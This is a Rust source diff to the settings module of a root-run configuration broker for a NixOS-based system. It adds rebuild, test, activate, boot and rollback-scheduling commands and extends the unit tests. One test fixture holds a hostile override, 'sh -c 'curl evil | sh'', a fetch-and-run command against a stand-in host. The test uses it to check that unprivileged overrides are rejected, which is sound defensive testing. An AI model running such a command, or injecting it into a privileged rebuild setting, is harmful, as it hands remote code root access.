@@ -21,6 +21,18 @@ pub struct Settings {
     pub state_dir: PathBuf,
     /// Run after each commit; `{repo}` is replaced with the repo path.
     pub rebuild: String,
+    /// `commit confirmed`: build the config and activate it without making it the boot default.
+    /// `{repo}`.
+    pub test: String,
+    /// Activate a system that already exists, without changing the boot default (the restore of an
+    /// unconfirmed commit). `{system}`.
+    pub activate: String,
+    /// Make a system the boot default (`confirm`, and the restore of an unconfirmed commit whose
+    /// boot default moved). `{system}`, `{profile}`.
+    pub boot: String,
+    /// Schedule the rollback of an unconfirmed commit: run `{broker} expire-confirm {seq}` after
+    /// `{seconds}`.
+    pub schedule: String,
     pub current_system: PathBuf,
     pub system_profile: PathBuf,
     /// PATH for everything the broker runs (git, sh, the rebuild, sync, systemctl).
@@ -36,9 +48,25 @@ pub struct Requested {
     pub repo: Option<PathBuf>,
     pub state_dir: Option<PathBuf>,
     pub rebuild: Option<String>,
+    pub test: Option<String>,
+    pub activate: Option<String>,
+    pub boot: Option<String>,
+    pub schedule: Option<String>,
     pub current_system: Option<PathBuf>,
     pub system_profile: Option<PathBuf>,
 }
+
+/// The default commands (a TorqOS machine's come from the fixed file, with the configuration name).
+/// Placeholders other than `{repo}` are replaced with shell-quoted values: never quote them here.
+pub const REBUILD: &str = "nixos-rebuild switch --flake {repo}";
+pub const TEST: &str = "nixos-rebuild test --flake {repo}";
+pub const ACTIVATE: &str = "{system}/bin/switch-to-configuration test";
+pub const BOOT: &str = "nix-env -p {profile} --set {system} && {system}/bin/switch-to-configuration boot";
+/// A transient timer: it does not survive a reboot, and a reboot needs none (the boot default is
+/// still the old system; the boot-time check ledgers the rollback). On failure (busy) it retries.
+pub const SCHEDULE: &str = "systemd-run --quiet --collect --unit=torq-confirm-{seq} --on-active={seconds} \
+     --timer-property=AccuracySec=1s --property=Restart=on-failure --property=RestartSec=5 \
+     {broker} expire-confirm {seq}";
 
 impl Settings {
     /// The defaults when there is no fixed file; PATH and HOME are inherited.
@@ -46,7 +74,11 @@ impl Settings {
         Settings {
             repo: "/var/lib/torq/config".into(),
             state_dir: "/var/lib/torq/state".into(),
-            rebuild: "nixos-rebuild switch --flake {repo}".into(),
+            rebuild: REBUILD.into(),
+            test: TEST.into(),
+            activate: ACTIVATE.into(),
+            boot: BOOT.into(),
+            schedule: SCHEDULE.into(),
             current_system: "/run/current-system".into(),
             system_profile: "/nix/var/nix/profiles/system".into(),
             path,
@@ -82,6 +114,10 @@ pub fn resolve(root: bool, fixed: Option<Settings>, asked: Requested, defaults: 
             check("--repo / TORQ_CONFIG_REPO", asked.repo.as_deref().map(s), s(&f.repo));
             check("--state-dir / TORQ_STATE_DIR", asked.state_dir.as_deref().map(s), s(&f.state_dir));
             check("--rebuild-cmd / TORQ_REBUILD_CMD", asked.rebuild.clone(), f.rebuild.clone());
+            check("--test-cmd / TORQ_TEST_CMD", asked.test.clone(), f.test.clone());
+            check("--activate-cmd / TORQ_ACTIVATE_CMD", asked.activate.clone(), f.activate.clone());
+            check("--boot-cmd / TORQ_BOOT_CMD", asked.boot.clone(), f.boot.clone());
+            check("--schedule-cmd / TORQ_SCHEDULE_CMD", asked.schedule.clone(), f.schedule.clone());
             check("--current-system / TORQ_CURRENT_SYSTEM", asked.current_system.as_deref().map(s), s(&f.current_system));
             check("--system-profile / TORQ_SYSTEM_PROFILE", asked.system_profile.as_deref().map(s), s(&f.system_profile));
             if !differs.is_empty() {
@@ -96,6 +132,10 @@ pub fn resolve(root: bool, fixed: Option<Settings>, asked: Requested, defaults: 
             repo: asked.repo.unwrap_or(defaults.repo),
             state_dir: asked.state_dir.unwrap_or(defaults.state_dir),
             rebuild: asked.rebuild.unwrap_or(defaults.rebuild),
+            test: asked.test.unwrap_or(defaults.test),
+            activate: asked.activate.unwrap_or(defaults.activate),
+            boot: asked.boot.unwrap_or(defaults.boot),
+            schedule: asked.schedule.unwrap_or(defaults.schedule),
             current_system: asked.current_system.unwrap_or(defaults.current_system),
             system_profile: asked.system_profile.unwrap_or(defaults.system_profile),
             path: defaults.path,
@@ -155,6 +195,10 @@ mod tests {
             repo: "/var/lib/torq/config".into(),
             state_dir: "/var/lib/torq/state".into(),
             rebuild: "nixos-rebuild switch --flake {repo}#torq".into(),
+            test: "nixos-rebuild test --flake {repo}#torq".into(),
+            activate: ACTIVATE.into(),
+            boot: BOOT.into(),
+            schedule: SCHEDULE.into(),
             current_system: "/run/current-system".into(),
             system_profile: "/nix/var/nix/profiles/system".into(),
             path: "/run/current-system/sw/bin".into(),
@@ -177,6 +221,10 @@ mod tests {
             Requested { repo: Some("/tmp/evil".into()), ..Default::default() },
             Requested { state_dir: Some("/tmp/fresh-ledger".into()), ..Default::default() },
             Requested { rebuild: Some("sh -c 'curl evil | sh'".into()), ..Default::default() },
+            Requested { test: Some("true".into()), ..Default::default() },
+            Requested { activate: Some("true".into()), ..Default::default() },
+            Requested { boot: Some("true".into()), ..Default::default() },
+            Requested { schedule: Some("true".into()), ..Default::default() },
             Requested { current_system: Some("/tmp/x".into()), ..Default::default() },
             Requested { system_profile: Some("/tmp/x".into()), ..Default::default() },
         ] {
@@ -244,10 +292,13 @@ mod tests {
     fn the_fixed_file_must_be_exactly_the_known_settings() {
         let dir = tempfile::tempdir().unwrap();
         let f = dir.path().join("broker.json");
-        std::fs::write(&f, r#"{"repo":"/r","stateDir":"/s","rebuild":"x","currentSystem":"/c","systemProfile":"/p","path":"/b","home":"/root"}"#).unwrap();
+        let known = r#""repo":"/r","stateDir":"/s","rebuild":"x","test":"x","activate":"x","boot":"x","schedule":"x","currentSystem":"/c","systemProfile":"/p","path":"/b","home":"/root""#;
+        std::fs::write(&f, format!("{{{known}}}")).unwrap();
         assert_eq!(Settings::read(&f).unwrap().unwrap().state_dir, PathBuf::from("/s"));
-        std::fs::write(&f, r#"{"repo":"/r","stateDir":"/s","rebuild":"x","currentSystem":"/c","systemProfile":"/p","path":"/b","home":"/root","extra":1}"#).unwrap();
+        std::fs::write(&f, format!("{{{known},\"extra\":1}}")).unwrap();
         assert!(Settings::read(&f).is_err(), "unknown fields are an error, not ignored");
+        std::fs::write(&f, r#"{"repo":"/r","stateDir":"/s","rebuild":"x","currentSystem":"/c","systemProfile":"/p","path":"/b","home":"/root"}"#).unwrap();
+        assert!(Settings::read(&f).is_err(), "a missing field is an error, not a default");
         assert!(Settings::read(&dir.path().join("missing.json")).unwrap().is_none());
     }
 }
